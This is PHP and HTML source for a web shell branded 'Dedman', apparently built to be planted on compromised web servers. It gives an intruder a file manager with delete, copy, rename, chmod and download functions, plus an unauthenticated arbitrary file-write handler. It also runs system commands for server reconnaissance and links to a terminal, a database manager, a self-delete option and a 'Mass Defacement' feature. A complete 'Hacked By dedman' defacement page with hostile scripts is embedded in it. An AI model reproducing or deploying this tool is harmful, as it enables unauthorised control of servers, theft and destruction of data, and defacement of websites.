<?php echo $perms 
?></a></td>
<td>
<?php echo $owner['name'] . ':' . $group['name'] 
?></td>

<?php endif;
 
?>
<td><a title="Delete" href="?p=
<?php echo urlencode(FM_PATH) 
?>&amp;
del=
<?php echo urlencode($f) 
?>" onclick="return confirm('Delete file?');
"><i class="fa fa-trash-o"></i></a> | 
<a title="Rename" href="#" onclick="rename('
<?php echo fm_enc(FM_PATH) 
?>', '
<?php echo fm_enc($f) 
?>');
return false;
"><i class="fa fa-pencil-square-o"></i></a> | 
<a title="Copy to..." href="?p=
<?php echo urlencode(FM_PATH) 
?>&amp;
copy=
<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) 
?>"><i class="fa fa-files-o"></i></a> | 
<a title="Direct link" href="
<?php echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f) 
?>" target="_blank"><i class="fa fa-link"></i></a> | 
<a title="Download" href="?p=
<?php echo urlencode(FM_PATH) 
?>&amp;
dl=
<?php echo urlencode($f) 
?>"><i class="fa fa-download"></i></a> | 

</td></tr>
 
<?php flush();
 } if (empty($folders) && empty($files)) { 
?>
<tr><td></td><td colspan="
<?php echo !FM_IS_WIN ? '6' : '4' 
?>"><em>Folder is empty</em></td></tr>

<?php } else { 
?>
<tr><td class="gray"></td><td class="gray" colspan="
<?php echo !FM_IS_WIN ? '6' : '4' 
?>">
Full size: <span title="
<?php printf('%s bytes', $all_files_size) 
?>">
<?php echo fm_get_filesize($all_files_size) 
?></span>,
files: 
<?php echo $num_files 
?>,
folders: 
<?php echo $num_folders 
?>
</td></tr>

<?php } 
?>
</table>
<p style="background-color: white;
" class="path footer-links"><a href="#/select-all" class="group-btn" onclick="select_all();
return false;
"><i class="fa fa-check-square"></i> Select all</a> &nbsp;

<a href="#/unselect-all" class="group-btn" onclick="unselect_all();
return false;
"><i class="fa fa-window-close"></i> Unselect all</a> &nbsp;

<a href="#/invert-all" class="group-btn" onclick="invert_all();
return false;
"><i class="fa fa-th-list"></i> Invert selection</a> &nbsp;

<input type="submit" class="hidden" name="delete" id="a-delete" value="Delete" onclick="return confirm('Delete selected files and folders?')">
<a href="javascript:document.getElementById('a-delete').click();
" class="group-btn"><i class="fa fa-trash"></i> Delete </a> &nbsp;

<input type="submit" class="hidden" name="zip" id="a-zip" value="Zip" onclick="return confirm('Create archive?')">
<a href="javascript:document.getElementById('a-zip').click();
" class="group-btn"><i class="fa fa-file-archive-o"></i> Zip </a> &nbsp;

<input type="submit" class="hidden" name="copy" id="a-copy" value="Copy">
<a href="javascript:document.getElementById('a-copy').click();
" class="group-btn"><i class="fa fa-files-o"></i> Copy </a>
<a target="_blank" class="float-right" style="color:lime">larva2.3 | made by #dedman</a></p>

</form>


<?php fm_show_footer();
 function getIp(){ $ip=$_SERVER['REMOTE_ADDR'];
 if(!empty($_SERVER['HTTP_CLIENT_IP'])){ $ip=$_SERVER['HTTP_CLIENT_IP'];
 }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){ $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
 } echo $ip;
 } function fm_rdelete($path) { if (is_link($path)) { return unlink($path);
 } elseif (is_dir($path)) { $objects = scandir($path);
 $ok = true;
 if (is_array($objects)) { foreach ($objects as $file) { if ($file != '.' && $file != '..') { if (!fm_rdelete($path . '/' . $file)) { $ok = false;
 } } } } return ($ok) ? rmdir($path) : false;
 } elseif (is_file($path)) { return unlink($path);
 } return false;
 } function fm_rchmod($path, $filemode, $dirmode) { if (is_dir($path)) { if (!chmod($path, $dirmode)) { return false;
 } $objects = scandir($path);
 if (is_array($objects)) { foreach ($objects as $file) { if ($file != '.' && $file != '..') { if (!fm_rchmod($path . '/' . $file, $filemode, $dirmode)) { return false;
 } } } } return true;
 } elseif (is_link($path)) { return true;
 } elseif (is_file($path)) { return chmod($path, $filemode);
 } return false;
 } function fm_rename($old, $new) { return (!file_exists($new) && file_exists($old)) ? rename($old, $new) : null;
 } function fm_rcopy($path, $dest, $upd = true, $force = true) { if (is_dir($path)) { if (!fm_mkdir($dest, $force)) { return false;
 } $objects = scandir($path);
 $ok = true;
 if (is_array($objects)) { foreach ($objects as $file) { if ($file != '.' && $file != '..') { if (!fm_rcopy($path . '/' . $file, $dest . '/' . $file)) { $ok = false;
 } } } } return $ok;
 } elseif (is_file($path)) { return fm_copy($path, $dest, $upd);
 } return false;
 } function fm_mkdir($dir, $force) { if (file_exists($dir)) { if (is_dir($dir)) { return $dir;
 } elseif (!$force) { return false;
 } unlink($dir);
 } return mkdir($dir, 0777, true);
 } function fm_copy($f1, $f2, $upd) { $time1 = filemtime($f1);
 if (file_exists($f2)) { $time2 = filemtime($f2);
 if ($time2 >= $time1 && $upd) { return false;
 } } $ok = copy($f1, $f2);
 if ($ok) { touch($f2, $time1);
 } return $ok;
 } function fm_get_mime_type($file_path) { if (function_exists('finfo_open')) { $finfo = finfo_open(FILEINFO_MIME_TYPE);
 $mime = finfo_file($finfo, $file_path);
 finfo_close($finfo);
 return $mime;
 } elseif (function_exists('mime_content_type')) { return mime_content_type($file_path);
 } elseif (!stristr(ini_get('disable_functions'), 'shell_exec')) { $file = escapeshellarg($file_path);
 $mime = shell_exec('file -bi ' . $file);
 return $mime;
 } else { return '--';
 } } function fm_redirect($url, $code = 302) { header('Location: ' . $url, true, $code);
 exit;
 } function fm_clean_path($path) { $path = trim($path);
 $path = trim($path, '\\/');
 $path = str_replace(array('../', '..\\'), '', $path);
 if ($path == '..') { $path = '';
 } return str_replace('\\', '/', $path);
 } function fm_get_parent_path($path) { $path = fm_clean_path($path);
 if ($path != '') { $array = explode('/', $path);
 if (count($array) > 1) { $array = array_slice($array, 0, -1);
 return implode('/', $array);
 } return '';
 } return false;
 } function fm_get_filesize($size) { if ($size < 1000) { return sprintf('%s B', $size);
 } elseif (($size / 1024) < 1000) { return sprintf('%s KiB', round(($size / 1024), 2));
 } elseif (($size / 1024 / 1024) < 1000) { return sprintf('%s MiB', round(($size / 1024 / 1024), 2));
 } elseif (($size / 1024 / 1024 / 1024) < 1000) { return sprintf('%s GiB', round(($size / 1024 / 1024 / 1024), 2));
 } else { return sprintf('%s TiB', round(($size / 1024 / 1024 / 1024 / 1024), 2));
 } } function fm_get_zif_info($path) { if (function_exists('zip_open')) { $arch = zip_open($path);
 if ($arch) { $filenames = array();
 while ($zip_entry = zip_read($arch)) { $zip_name = zip_entry_name($zip_entry);
 $zip_folder = substr($zip_name, -1) == '/';
 $filenames[] = array( 'name' => $zip_name, 'filesize' => zip_entry_filesize($zip_entry), 'compressed_size' => zip_entry_compressedsize($zip_entry), 'folder' => $zip_folder );
 } zip_close($arch);
 return $filenames;
 } } return false;
 } function fm_enc($text) { return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
 } function fm_set_msg($msg, $status = 'ok') { $_SESSION['message'] = $msg;
 $_SESSION['status'] = $status;
 } function fm_is_utf8($string) { return preg_match('//u', $string);
 } function fm_convert_win($filename) { if (FM_IS_WIN && function_exists('iconv')) { $filename = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $filename);
 } return $filename;
 } function fm_get_file_icon_class($path) { $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
 switch ($ext) { case 'ico': case 'gif': case 'jpg': case 'jpeg': case 'jpc': case 'jp2': case 'jpx': case 'xbm': case 'wbmp': case 'png': case 'bmp': case 'tif': case 'tiff': case 'svg': $img = 'fa fa-picture-o';
 break;
 case 'passwd': case 'ftpquota': case 'sql': case 'js': case 'json': case 'sh': case 'config': case 'twig': case 'tpl': case 'md': case 'gitignore': case 'c': case 'cpp': case 'cs': case 'py': case 'map': case 'lock': case 'dtd': $img = 'fa fa-file-code-o';
 break;
 case 'txt': case 'ini': case 'conf': case 'log': case 'htaccess': $img = 'fa fa-file-text-o';
 break;
 case 'css': case 'less': case 'sass': case 'scss': $img = 'fa fa-css3';
 break;
 case 'zip': case 'rar': case 'gz': case 'tar': case '7z': $img = 'fa fa-file-archive-o';
 break;
 case 'php': case 'php4': case 'php5': case 'phps': case 'phtml': $img = 'fa fa-code';
 break;
 case 'htm': case 'html': case 'shtml': case 'xhtml': $img = 'fa fa-html5';
 break;
 case 'xml': case 'xsl': $img = 'fa fa-file-excel-o';
 break;
 case 'wav': case 'mp3': case 'mp2': case 'm4a': case 'aac': case 'ogg': case 'oga': case 'wma': case 'mka': case 'flac': case 'ac3': case 'tds': $img = 'fa fa-music';
 break;
 case 'm3u': case 'm3u8': case 'pls': case 'cue': $img = 'fa fa-headphones';
 break;
 case 'avi': case 'mpg': case 'mpeg': case 'mp4': case 'm4v': case 'flv': case 'f4v': case 'ogm': case 'ogv': case 'mov': case 'mkv': case '3gp': case 'asf': case 'wmv': $img = 'fa fa-file-video-o';
 break;
 case 'eml': case 'msg': $img = 'fa fa-envelope-o';
 break;
 case 'xls': case 'xlsx': $img = 'fa fa-file-excel-o';
 break;
 case 'csv': $img = 'fa fa-file-text-o';
 break;
 case 'bak': $img = 'fa fa-clipboard';
 break;
 case 'doc': case 'docx': $img = 'fa fa-file-word-o';
 break;
 case 'ppt': case 'pptx': $img = 'fa fa-file-powerpoint-o';
 break;
 case 'ttf': case 'ttc': case 'otf': case 'woff':case 'woff2': case 'eot': case 'fon': $img = 'fa fa-font';
 break;
 case 'pdf': $img = 'fa fa-file-pdf-o';
 break;
 case 'psd': case 'ai': case 'eps': case 'fla': case 'swf': $img = 'fa fa-file-image-o';
 break;
 case 'exe': case 'msi': $img = 'fa fa-file-o';
 break;
 case 'bat': $img = 'fa fa-terminal';
 break;
 default: $img = 'fa fa-info-circle';
 } return $img;
 } function fm_get_image_exts() { return array('ico', 'gif', 'jpg', 'jpeg', 'jpc', 'jp2', 'jpx', 'xbm', 'wbmp', 'png', 'bmp', 'tif', 'tiff', 'psd');
 } function fm_get_video_exts() { return array('webm', 'mp4', 'm4v', 'ogm', 'ogv', 'mov');
 } function fm_get_audio_exts() { return array('wav', 'mp3', 'ogg', 'm4a');
 } function fm_get_text_exts() { return array( 'txt', 'css', 'ini', 'conf', 'log', 'htaccess', 'passwd', 'ftpquota', 'sql', 'js', 'json', 'sh', 'config', 'php', 'php4', 'php5', 'phps', 'phtml', 'htm', 'html', 'shtml', 'xhtml', 'xml', 'xsl', 'm3u', 'm3u8', 'pls', 'cue', 'eml', 'msg', 'csv', 'bat', 'twig', 'tpl', 'md', 'gitignore', 'less', 'sass', 'scss', 'c', 'cpp', 'cs', 'py', 'map', 'lock', 'dtd', 'svg', );
 } function fm_get_text_mimes() { return array( 'application/xml', 'application/javascript', 'application/x-javascript', 'image/svg+xml', 'message/rfc822', );
 } function fm_get_text_names() { return array( 'license', 'readme', 'authors', 'contributors', 'changelog', );
 } class FM_Zipper { private $zip;
 public function __construct() { $this->zip = new ZipArchive();
 } public function create($filename, $files) { $res = $this->zip->open($filename, ZipArchive::CREATE);
 if ($res !== true) { return false;
 } if (is_array($files)) { foreach ($files as $f) { if (!$this->addFileOrDir($f)) { $this->zip->close();
 return false;
 } } $this->zip->close();
 return true;
 } else { if ($this->addFileOrDir($files)) { $this->zip->close();
 return true;
 } return false;
 } } public function unzip($filename, $path) { $res = $this->zip->open($filename);
 if ($res !== true) { return false;
 } if ($this->zip->extractTo($path)) { $this->zip->close();
 return true;
 } return false;
 } private function addFileOrDir($filename) { if (is_file($filename)) { return $this->zip->addFile($filename);
 } elseif (is_dir($filename)) { return $this->addDir($filename);
 } return false;
 } private function addDir($path) { if (!$this->zip->addEmptyDir($path)) { return false;
 } $objects = scandir($path);
 if (is_array($objects)) { foreach ($objects as $file) { if ($file != '.' && $file != '..') { if (is_dir($path . '/' . $file)) { if (!$this->addDir($path . '/' . $file)) { return false;
 } } elseif (is_file($path . '/' . $file)) { if (!$this->zip->addFile($path . '/' . $file)) { return false;
 } } } } return true;
 } return false;
 } } function fm_show_nav_path($path) { 
?>
<div class="path">
<div class="float-right">
<a title="Upload files" href="?p=
<?php echo urlencode(FM_PATH) 
?>&amp;
upload"><i class="fa fa-cloud-upload"></i></a> | 
<a title="New folder" href="#" onclick="newfolder('
<?php echo fm_enc(FM_PATH) 
?>');
return false;
"><i class="fa fa-folder"></i></a>

</div>
 
<?php $path = fm_clean_path($path);
 $root_url = "<a style='float: left;
' href='?p='><i class='fa fa-home' title='" . FM_ROOT_PATH . "'></i></a>";
 $sep = '<i class="icon-separator"></i>';
 if ($path != '') { $exploded = explode('/', $path);
 $count = count($exploded);
 $array = array();
 $parent = '';
 for ($i = 0;
 $i < $count;
 $i++) { $parent = trim($parent . '/' . $exploded[$i], '/');
 $parent_enc = urlencode($parent);
 $array[] = "<a href='?p={$parent_enc}'>" . fm_convert_win($exploded[$i]) . "</a>";
 } $root_url .= $sep . implode($sep, $array);
 } echo '<div class="break-word">' . $root_url . '<br /><a></a></div>';
 
?>
</div>

<?php } function fm_show_message() { if (isset($_SESSION['message'])) { $class = isset($_SESSION['status']) ? $_SESSION['status'] : 'ok';
 echo '<p class="message ' . $class . '">' . $_SESSION['message'] . '</p>';
 unset($_SESSION['message']);
 unset($_SESSION['status']);
 } } function fm_show_header() { $sprites_ver = '20160315';
 header("Content-Type: text/html; charset=utf-8");
 header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
 header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
 header("Pragma: no-cache");
 
?>






<!-- php wire file complete srat here -->

<?php if(isset($_POST['save'])) { $f=$_POST['file'];
 $ext=$_POST['ext'];
 $data=$_POST['data'];
 $file=$f.$ext;
 if(file_exists($file)) { echo "<font color='red'>file already exists</font>";
 } else { $fo = fopen($file,"w");
 fwrite($fo,$data);
 echo "your data is saved";
 } } 
?>
<!-- php write file comple ends here -->
<!DOCTYPE html>
<html>
<head>

<title>Dedman</title>

<!-- imports -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<!-- import ends here -->

<!-- filemanager imports end here -->
<link rel="icon" href="http://www.omgubuntu.co.uk/wp-content/uploads/2016/09/terminal-icon.png" type="image/png">
<link rel="shortcut icon" href="
<?php echo FM_SELF_URL 
?>?img=favicon" type="image/png">

<?php if (isset($_GET['view']) && FM_USE_HIGHLIGHTJS): 
?>
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.2.0/styles/
<?php echo FM_HIGHLIGHTJS_STYLE 
?>.min.css">

<?php endif;
 
?>


<!-- filemanager imports ends here -->

<!-- style start shere -->
<style>
body {
 margin:0;

 background:#173B0B;

 
}

.floating-box {
 display: inline-block;

 width: 30%;


 height: 30%;

 margin: 10px;

 border: 2px solid #73AD21;
 
}

.after-box {
 border: 3px solid red;
 
}

.topnav {
 overflow: hidden;

}

.topnav a {
 float: left;

 display: block;

 color: lime;

 text-align: center;

 padding: 14px 16px;

 text-decoration: none;

 font-size: 17px;

}

.topnav a:hover {
 background-color: lime;

 color: white;

}

.topnav a.active {
 background-color: #4CAF50;

 color: white;

}
#myDIV {
 width: 100%;

 padding: 50px 0;

 text-align: center;

 background-color: grey;

 margin-top: 20px;

}
</style>
<!-- style ends here -->




<!-- start script here -->
<script>

function myFunWrite() {
 var x = document.getElementById("myDIV");

 if (x.style.display === "none") {
 x.style.display = "block";

 } else {
 x.style.display = "none";

 }
}

function myFunDef() {
 var x = document.getElementById("myDef");

 if (x.style.display === "none") {
 x.style.display = "block";

 } else {
 x.style.display = "none";

 }
}
 

function myFunFile() {
 var x = document.getElementById("myFM");

 if (x.style.display === "none") {
 x.style.display = "block";

 } else {
 x.style.display = "none";

 }
}

function myFunDown() {
 var x = document.getElementById("myfd");

 if (x.style.display === "none") {
 x.style.display = "block";

 } else {
 x.style.display = "none";

 }
}

function myAFunBash() {
 var x = document.getElementById("myAFM");

 if (x.style.display === "none") {
 x.style.display = "block";

 } else {
 x.style.display = "none";

 }
}

function myAFunDB() {
 var x = document.getElementById("myDBM");

 if (x.style.display === "none") {
 x.style.display = "block";

 } else {
 x.style.display = "none";

 }
}



</script>
<!-- scripts end here -->
<style>
a img,img{border:none}.filename,td,th{white-space:nowrap}.close,.close:focus,.close:hover,.php-file-tree a,a{text-decoration:none}a,body,code,div,em,form,html,img,label,li,ol,p,pre,small,span,strong,table,td,th,tr,ul{margin:0;
padding:0;
vertical-align:baseline;
outline:0;
font-size:100%;
background:0 0;
border:none;
text-decoration:none}p,table,ul{margin-bottom:10px}html{overflow-y:scroll}body{padding:0;
font:13px/16px Tahoma,Arial,sans-serif;
color:#222;
background:#F7F7F7;
margin:50px 30px 0}button,input,select,textarea{font-size:inherit;
font-family:inherit}a{color:#296ea3}a:hover{color:#b00}img{vertical-align:middle}span{color:#777}small{font-size:11px;
color:#999}ul{list-style-type:none;
margin-left:0}ul li{padding:3px 0}table{border-collapse:collapse;
border-spacing:0;
width:100%}.file-tree-view+#main-table{width:75%!important;
float:left}td,th{padding:4px 7px;
text-align:left;
vertical-align:top;
border:1px solid #ddd;
background:#fff}td.gray,th{background-color:#eee}td.gray span{color:#222}tr:hover td{background-color:#f5f5f5}tr:hover td.gray{background-color:#eee}.table{width:100%;
max-width:100%;
margin-bottom:1rem}.table td,.table th{padding:.55rem;
vertical-align:top;
border-top:1px solid #ddd}.table thead th{vertical-align:bottom;
border-bottom:2px solid #eceeef}.table tbody+tbody{border-top:0px solid #eceeef}.table .table{background-color:#fff}code,pre{display:block;
margin-bottom:10px;
font:13px/16px Consolas,'Courier New',Courier,monospace;
border:1px dashed #ccc;
padding:5px;
overflow:auto}.hidden,.modal{display:none}.btn,.close{font-weight:700}pre.with-hljs{padding:0}pre.with-hljs code{margin:0;
border:0;
overflow:visible}code.maxheight,pre.maxheight{max-height:512px}input[type=checkbox]{margin:0;
padding:0}.message,.path{padding:4px 7px;
border:1px solid #ddd;
background-color:#fff}.fa.fa-caret-right{font-size:1.2em;
margin:0 4px;
vertical-align:middle;
color:#ececec}.fa.fa-home{font-size:1.2em;
vertical-align:bottom}#wrapper{min-width:400px;
margin:0 auto}.path{margin-bottom:10px}.right{text-align:right}.center,.close,.login-form{text-align:center}.float-right{float:right}.float-left{float:left}.message.ok{border-color:lime;
color:lime}.message.error{border-color:red;
color:red}.message.alert{border-color:orange;
color:orange}.btn{border:0;
background:0 0;
padding:0;
margin:0;
color:#296ea3;
cursor:pointer}.btn:hover{color:#b00}.preview-img{max-width:100%;
background:url(data:image/png;
base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC)}.inline-actions>a>i{font-size:1em;
margin-left:5px;
background:#3785c1;
color:#fff;
padding:3px;
border-radius:3px}.preview-video{position:relative;
max-width:100%;
height:0;
padding-bottom:62.5%;
margin-bottom:10px}.preview-video video{position:absolute;
width:100%;
height:100%;
left:0;
top:0;
background:#000}.compact-table{border:0;
width:auto}.compact-table td,.compact-table th{width:100px;
border:0;
text-align:center}.compact-table tr:hover td{background-color:#fff}.filename{max-width:420px;
overflow:hidden;
text-overflow:ellipsis}.break-word{word-wrap:break-word;
margin-left:30px}.break-word.float-left a{color:#7d7d7d}.break-word+.float-right{padding-right:30px;
position:relative}.break-word+.float-right>a{color:#7d7d7d;
font-size:1.2em;
margin-right:4px}.modal{position:fixed;
z-index:1;
padding-top:100px;
left:0;
top:0;
width:100%;
height:100%;
overflow:auto;
background-color:#000;
background-color:rgba(0,0,0,.4)}#editor,.edit-file-actions{position:absolute;
right:30px}.modal-content{background-color:#fefefe;
margin:auto;
padding:20px;
border:1px solid #888;
width:80%}.close:focus,.close:hover{color:#000;
cursor:pointer}#editor{top:50px;
bottom:5px;
left:30px}.edit-file-actions{top:0;
background:#fff;
margin-top:5px}.edit-file-actions>a,.edit-file-actions>button{background:#fff;
padding:5px 15px;
cursor:pointer;
color:#296ea3;
border:1px solid #296ea3}.group-btn{background:#fff;
padding:2px 6px;
border:1px solid;
cursor:pointer;
color:#296ea3}.main-nav{position:fixed;
top:0;
left:0;
padding:10px 30px 10px 1px;
width:100%;
background:#fff;
color:#000;
border:0;
box-shadow:0 4px 5px 0 rgba(0,0,0,.14),0 1px 10px 0 rgba(0,0,0,.12),0 2px 4px -1px rgba(0,0,0,.2)}.login-form{width:320px;
margin:0 auto;
box-shadow:0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12),0 5px 5px -3px rgba(0,0,0,.2)}.login-form label,.path.login-form input{padding:8px;
margin:10px}.footer-links{background:0 0;
border:0;
clear:both}select[name=lang]{border:none;
position:relative;
text-transform:uppercase;
left:-30%;
top:12px;
color:silver}input[type=search]{height:30px;
margin:5px;
width:80%;
border:1px solid #ccc}.path.login-form input[type=submit]{background-color:#4285f4;
color:#fff;
border:1px solid;
border-radius:2px;
font-weight:700;
cursor:pointer}.modalDialog{position:fixed;
font-family:Arial,Helvetica,sans-serif;
top:0;
right:0;
bottom:0;
left:0;
background:rgba(0,0,0,.8);
z-index:99999;
opacity:0;
-webkit-transition:opacity .4s ease-in;
-moz-transition:opacity .4s ease-in;
transition:opacity .4s ease-in;
pointer-events:none}.modalDialog:target{opacity:1;
pointer-events:auto}.modalDialog>.model-wrapper{max-width:400px;
position:relative;
margin:10% auto;
padding:15px;
border-radius:2px;
background:#fff}.close{float:right;
background:#fff;
color:#000;
line-height:25px;
position:absolute;
right:0;
top:0;
width:24px;
border-radius:0 5px 0 0;
font-size:18px}.close:hover{background:#e4e4e4}.modalDialog p{line-height:30px}div#searchresultWrapper{max-height:320px;
overflow:auto}div#searchresultWrapper li{margin:8px 0;
list-style:none}li.file:before,li.folder:before{font:normal normal normal 14px/1 FontAwesome;
content:"\f016";
margin-right:5px}li.folder:before{content:"\f114"}i.fa.fa-folder-o{color:#eeaf4b}i.fa.fa-picture-o{color:#26b99a}i.fa.fa-file-archive-o{color:#da7d7d}.footer-links i.fa.fa-file-archive-o{color:#296ea3}i.fa.fa-css3{color:#f36fa0}i.fa.fa-file-code-o{color:#ec6630}i.fa.fa-code{color:#cc4b4c}i.fa.fa-file-text-o{color:#0096e6}i.fa.fa-html5{color:#d75e72}i.fa.fa-file-excel-o{color:#09c55d}i.fa.fa-file-powerpoint-o{color:#f6712e}.file-tree-view{width:24%;
float:left;
overflow:auto;
border:1px solid #ddd;
border-right:0;
background:#fff}.file-tree-view .tree-title{background:#eee;
padding:9px 2px 9px 10px;
font-weight:700}.file-tree-view ul{margin-left:15px;
margin-bottom:0}.file-tree-view i{padding-right:3px}.php-file-tree{font-size:100%;
letter-spacing:1px;
line-height:1.5;
margin-left:5px!important}.php-file-tree a{color:#296ea3}.php-file-tree A:hover{color:#b00}.php-file-tree .open{font-style:italic;
color:#2183ce}.php-file-tree .closed{font-style:normal}#file-tree-view::-webkit-scrollbar{width:10px;
background-color:#F5F5F5}#file-tree-view::-webkit-scrollbar-track{border-radius:10px;
background:rgba(0,0,0,.1);
border:1px solid #ccc}#file-tree-view::-webkit-scrollbar-thumb{border-radius:10px;
background:linear-gradient(left,#fff,#e4e4e4);
border:1px solid #aaa}#file-tree-view::-webkit-scrollbar-thumb:hover{background:#fff}#file-tree-view::-webkit-scrollbar-thumb:active{background:linear-gradient(left,#22ADD4,#1E98BA)}
</style>
</head>

<?php $DF = disk_free_space("/");
 $DT = disk_total_space("/") ;
 
?>
<body style="
 background-color: black;
 border: 0px;
">






<!-- side nav bar starts here -->
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>


.sidenav {
 height: 100%;

 width: 0px;

 position: fixed;

 z-index: 1;

 top: 0;

 left: 0;

 background-color: #111;

 overflow-x: hidden;

 transition: 0.5s;

 padding-top: 60px;

}

.sidenav a {
 padding: 8px 8px 8px 32px;

 text-decoration: none;

 font-size: 15px;

 color: #818181;

 display: block;

 transition: 0.3s;

}

.sidenav a:hover {
 color: #f1f1f1;

}

.sidenav .closebtn {
 position: absolute;

 top: 0;

 right: 25px;

 font-size: 36px;

 margin-left: 50px;

}

#main {
 transition: margin-left .5s;

 padding: 16px;

}

@media screen and (max-height: 450px) {
 .sidenav {padding-top: 15px;
}
 .sidenav a {font-size: 10px;
}
}
</style>

<div class="sidenavbar">

<div id="mySidenav" class="sidenav">
 <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;
</a>
 <a class="active" style=" color:black;
font-size: 30px;
 color: lime;
" ><b>Dedman</b></a><hr>
 <a style="color: lime;
 ">Server Software :
<?php echo $_SERVER['SERVER_SOFTWARE'];
 
?></a>
 <a style="color: lime;
"> 
<?php echo "Server Time : " . date("Y/m/d h:i:sa") 
?> </a>
 <a style="color: lime;
"> 
<?php $def = round(disk_free_space("/") / 1024 / 1024 / 1024);
 print("Free space: $def GB - ");
 $df = round(disk_total_space("/") / 1024 / 1024 / 1024);
 print("OF : $df GB");
 
?> </a>
 <a style="color: lime;
 "> Operating System: 
<?php echo php_uname();
 
?> </a>
 <a style="color: lime;
 ">Your IP : 
<?php getIp();
 
?> </a>

 <a style="color: lime;
 ">Server IP : 
<?php echo $_SERVER['SERVER_ADDR'].':'.$_SERVER['SERVER_PORT'] ;
 
?> </a>
 <a style="color: lime;
"> PHP Version: 
<?php echo PHP_VERSION 
?></a>
 <a style="color: lime;
 " >SafeMode : 
<?php echo (@ini_get('safe_mode') ? 'on' : 'off') 
?></a>
 <a style="color: lime;
 " >User : 
<?php $esr = system("whoami");

?></a>
 <a style="color: lime;
 " >
<?php echo 'HOST : ' . gethostname();
 
?></a>
 <a style="color: lime;
 " >
 
<?php function _is_curl_installed() { if (in_array ('curl', get_loaded_extensions())) { return true;
 } else { return false;
 } } if (_is_curl_installed()) { echo "CURL : <span style=\"color:lime\">installed</span>";
 } else { echo "CURL : NOT <span style=\"color:red\">installed</span>";
 } 
?>
 <br></a><hr>
</div>

 </div>


<script>
function openNav() {
 document.getElementById("mySidenav").style.width = "100%";

 document.getElementById("main").style.marginLeft = "250px";

}

function closeNav() {
 document.getElementById("mySidenav").style.width = "0";

 document.getElementById("main").style.marginLeft= "0";

}
</script>

<!-- side nav bar ends here -->
<!-- navigtaion bar starts here -->

<div class="topnav">
 <a><span style="color:white;
background-color: lime;
 font-size: 30px;
 " onclick="openNav()">&#9776;
 Dedman</span></a>
 <a href="#write" onclick="myFunWrite()" >[ Write File ]</a>
 <a href="#fileman" onclick="myFunFile()">[ File Manager ]</a>
 <a href="?terminal=true" onclick="myAFunBash()">[ Terminal ]</a>
 <a href="#DB-Man" onclick="myAFunDB()">[ DB-Man ]</a>
 <a href="#DB-Man" onclick="myFunDown()">[ Link Down ]</a>
 <a href="?pinfo" ><b>[ phpinfo ]</b></a>
 <a href="#deface" onclick="myFunDef()" style=" color: red;
float: right;
 "><b>[ Mass Defacement ]</b></a>
 <a href="?sucide" style="float: right;
 color: red;
 "><b>[ Sucide ]</b></a> 
</div>
<!-- navigation bar ends here -->
<!-- defacement code starts here -->
<center>
<div id="myDef" style="display: none;
 width: 80%;
"><hr><div class="topnav" style="background-color: black;
">

<?php $deface = "<html><head>

<title>Hacked By : dedman</title>
<link rel='icon' href='http://www.omgubuntu.co.uk/wp-content/uploads/2016/09/terminal-icon.png' type='image/png'>
<body oncontextmenu='return false;
' onkeydown='return false;
' onmousedown='return false;
' bgcolor='#000000'>
<BODY bgcolor='#000000' style='background-image: url('http://i50.tinypic.com/154x5s1.gif')'>
<table width=100% height=100%>
<td align=center>
<img style='width: 30%;
 height: auto;
'
 src='http://i.imgur.com/Ipg62jA.jpg' />
<style type='text/css'>
 .style2 {font-size: small} 
 .style4 {color: #FFAA00;
 font-weight: bold;
 } 
 .style5 {color: #FFFFFF} 
 .style8 {color: #FFFFFF;
 font-weight: bold;
 }
 .style10 {color: #FF0000}
</style>
</span>
</font>
</b>

<font color='#008000'>
<style>
body {
background: #000;

font-family: 'Tahoma', Verdana, sans-serif;

}
h1 {
color: #333;

font-size: 45px;

margin: 1px auto;

text-align:center;

text-transform:uppercase;

}
.neon {
color: #FF0000;

text-shadow: 0 0 3px #FFFFFF, 0 0 7px #00FFFF, 0 0 17px #FFAA00, 0 0 42px #FFAA00, 0 0 38px #FFAA00;

}
<script language='JavaScript1.2'>
function ClearError() {return true;
}
window.onerror = ClearError;

</script>
</style>

<script>
window.onload = function() {
var h1 = document.getElementsByTagName('h1')[0],
text = h1.innerText || h1.textContent,
split = [], i, lit = 0, timer = null;

for(i = 0;
 i < text.length;
 ++i) {
split.push('<span>' + text[i] + '</span>');

}
h1.innerHTML = split.join('');

split = h1.childNodes;


var flicker = function() {
lit += 0.01;

if(lit >= 1) {
clearInterval(timer);

}
for(i = 0;
 i < split.length;
 ++i) {
if(Math.random() < lit) {
split[i].className = 'neon';

} else {
split[i].className = '';

}
}
}
setInterval(flicker, 100);

}
</script>
</font>
</font>
<br>
<h1>Hacked By dedman </h1>
<br>
<center><H1 style='color:#fff;
'></H1></center>

<center>
<h1><center>
<font text=' javascript'=' src='http://www.freewebs.com/p.js' face='vivaldi' size='24<center><noscript></noscript><!-- --><script type='><script> 
farbbibliothek = new Array();
 
farbbibliothek[0] = new Array('#FF0000','#FF1100','#FF2200','#FF3300','#FF4400','#FF5500','#FF6600','#FF7700','#FF8800','#FF9900','#FFaa00','#FFbb00','#FFcc00','#FFdd00','#FFee00','#FFff00','#FFee00','#FFdd00','#FFcc00','#FFbb00','#FFaa00','#FF9900','#FF8800','#FF7700','#FF6600','#FF5500','#FF4400','#FF3300','#FF2200','#FF1100');
 
